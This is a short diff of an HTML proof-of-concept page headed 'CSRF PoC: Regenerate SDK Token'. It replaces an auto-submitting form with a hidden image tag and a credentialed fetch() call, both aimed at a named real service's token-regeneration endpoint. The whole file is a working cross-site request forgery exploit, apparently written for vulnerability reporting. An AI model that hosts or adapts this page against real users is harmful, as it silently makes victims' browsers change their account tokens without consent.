@@ -1,14 +1,21 @@
+<!DOCTYPE html>
 <html>
-  <body>
-    <form action="https://app.flourish.studio/api/user/generate_sdk_token" method="POST">
-    </form>
+<head>
+  <title>CSRF PoC - Regenerate Token</title>
+</head>
+<body>
+  <h1>CSRF PoC: Regenerate SDK Token</h1>
 
-    <script>
-      document.forms[0].submit();
-    </script>
-  </body>
+  <img src="https://app.flourish.studio/api/user/generate_sdk_token" style="display:none" alt="CSRF Test" />
+
+  <script>
+    fetch('https://app.flourish.studio/api/user/generate_sdk_token', {
+      method: 'GET',
+      credentials: 'include'
+    });
+  </script>
+</body>
 </html>
-
 
 
 
